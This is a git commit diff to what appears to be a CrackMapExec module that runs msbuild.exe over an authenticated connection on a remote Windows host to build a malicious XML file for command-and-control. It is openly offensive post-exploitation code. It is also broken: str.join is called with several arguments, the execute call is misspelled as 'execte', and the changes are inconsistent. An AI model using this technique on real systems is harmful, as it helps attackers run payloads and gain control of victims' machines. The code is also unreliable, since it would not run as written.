f50d788a602b7f1734ce09c74aa50bc9e89d714c
Matthew Morrison <matthewmorrison89@gmail.com>
2020-05-07 13:50:32 -0400

    Trying again?

--- cme/modules/msbuild.py
+++ cme/modules/msbuild.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
+import os
 class CMEModule:
     '''
         Executes msbuild to build a malicious .xml file for C2 purposes.
@@ -31,26 +31,15 @@ class CMEModule:
 
     def on_login(self, context, connection):
         if self.arch == 'x64':
-            if os.path.isdir(r(os.environ['WINDIR'] + "Microsoft.NET" + "Framework64")):
-                 command = ' '.join(os.environ['WINDIR'], "Microsoft.NET", "Framework64", self.ver, "msbuild.exe", self.filename)
-            else:
-                print("msbuild doesn't exist or couldn't be found(x64)")
+            winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework64", self.ver, "msbuild.exe")
+            command = ''.join(winders, self.filename)
 
         elif self.arch == 'x86':
-            if os.path.isdir(r(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe", self.filename))
-                command = ' '.join(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe", self.filename)
-            else:
-                print("msbuild doesn't exist or couldn't be found (x86)")
+            winders = os.path.join(os.environ['WINDIR'], "Microsoft.NET", "Framework", self.ver, "msbuild.exe")
+            command = ' '.join(winders, self.filename)
+        
         else:
             print("You need to supply the 'ARCH' command line argument :)")
 
         connection.execte(command)
         context.log.success("Executed msbuild on" + self.filename)
-
-    #def on_admin_login(self, context, connection):
-    #    '''Concurrent. Required if on_login is not present. This gets called on each authenticated connection with Administrative privileges'''
-    #    pass
-
-    #def on_request(self, context, request):
-    #    '''Optional. If the payload needs to retrieve additonal files, add this function to the module'''
-    #    pass
